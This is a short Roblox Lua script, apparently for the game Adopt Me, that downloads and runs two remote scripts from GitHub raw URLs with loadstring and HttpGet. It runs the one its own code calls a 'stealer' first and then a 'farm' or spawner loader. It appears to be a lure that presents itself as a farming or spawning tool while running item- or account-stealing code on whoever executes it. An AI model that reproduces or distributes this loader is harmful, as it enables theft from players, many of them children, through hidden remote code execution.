local function stealer()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kiroscrpts/adoptmescript/refs/heads/main/adoptmefunction.lua"))()
    end)
    if not success then
        warn("Failed to run stealer script:", err)
    end
end

local function farm()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeScriptt/loadingandspawner/refs/heads/main/finalspawnerloading.lua.txt"))()
    end)
    if not success then
        warn("Failed to run farm script:", err)
    end
end

-- Slight delay to avoid resource contention
task.spawn(function()
    stealer()
end)

task.delay(1, function()
    farm()
end)
